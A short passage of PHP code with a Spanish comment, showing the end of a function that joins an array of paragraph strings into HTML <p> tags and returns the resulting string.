    // abrimos tag, deconstruimos el array, cerramos tag
    $string = '<p>' . implode("</p>\n<p>", $strParrafos) . '</p>';

    return $string;
}
